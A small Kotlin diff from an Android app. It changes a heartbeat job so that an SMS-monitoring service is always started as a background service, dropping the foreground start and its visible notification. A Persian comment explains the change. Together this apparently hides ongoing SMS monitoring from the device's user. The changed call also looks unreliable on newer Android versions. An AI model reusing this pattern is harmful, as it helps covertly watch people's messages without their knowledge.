@@ -53,13 +53,10 @@ class HeartbeatJobService : JobService() {
                 Log.d(TAG, "UnifiedService started from JobService")
             }
             
-            // SmsMonitorService
+            // SmsMonitorService (background service)
             val smsMonitorIntent = android.content.Intent(this, SmsMonitorService::class.java)
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                startForegroundService(smsMonitorIntent)
-            } else {
-                startService(smsMonitorIntent)
-            }
+            // همیشه به عنوان background service راه‌اندازی میشه
+            startService(smsMonitorIntent)
             Log.d(TAG, "Services ensured from JobService")
             
         } catch (e: Exception) {
